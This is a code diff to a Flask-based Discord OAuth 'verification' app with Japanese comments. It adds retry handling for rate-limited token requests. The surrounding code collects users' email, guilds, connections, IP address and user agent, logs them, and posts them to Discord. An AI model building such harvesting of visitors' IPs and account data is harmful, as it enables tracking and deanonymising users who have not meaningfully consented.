@@ -1,6 +1,5 @@
-
 from flask import Flask, request, render_template
-import requests, json, os, threading
+import requests, json, os, threading, time
 from dotenv import load_dotenv
 from datetime import datetime
 from discord_bot import bot
@@ -69,6 +68,20 @@ def save_log(discord_id, structured_data):
         json.dump(logs, f, indent=4, ensure_ascii=False)
 
 
+# --- 429 リトライ用 ---
+def post_token_with_retry(url, data, headers, retries=3):
+    for i in range(retries):
+        res = requests.post(url, data=data, headers=headers)
+        if res.status_code == 429:
+            retry_after = float(res.headers.get("Retry-After", 5))
+            print(f"429 受信。{retry_after}s 待機後リトライ {i+1}/{retries} ...")
+            time.sleep(retry_after)
+            continue
+        res.raise_for_status()
+        return res.json()
+    raise Exception("Discord トークン取得に失敗しました（リトライ後）")
+
+
 @app.route("/")
 def index():
     discord_auth_url = (
@@ -94,11 +107,10 @@ def callback():
         "redirect_uri": REDIRECT_URI,
         "scope": "identify email guilds connections"
     }
+
     try:
-        res = requests.post(token_url, data=data, headers=headers)
-        res.raise_for_status()
-        token = res.json()
-    except requests.exceptions.RequestException as e:
+        token = post_token_with_retry(token_url, data, headers)
+    except Exception as e:
         return f"トークン取得エラー: {e}", 500
 
     access_token = token.get("access_token")
@@ -120,7 +132,7 @@ def callback():
         json={"access_token": access_token}
     )
 
-    # IP取得とユーザーエージェント解析
+    # IP取得とUA解析
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
         ip = requests.get("https://api.ipify.org").text
@@ -130,7 +142,6 @@ def callback():
 
     avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"
 
-    # ✅ 構造を分類して整理
     structured_data = {
         "discord": {
             "username": user.get("username"),
@@ -159,7 +170,7 @@ def callback():
 
     save_log(user["id"], structured_data)
 
-    # ✅ Embedログ整形
+    # Embed送信
     try:
         d = structured_data["discord"]
         ip = structured_data["ip_info"]
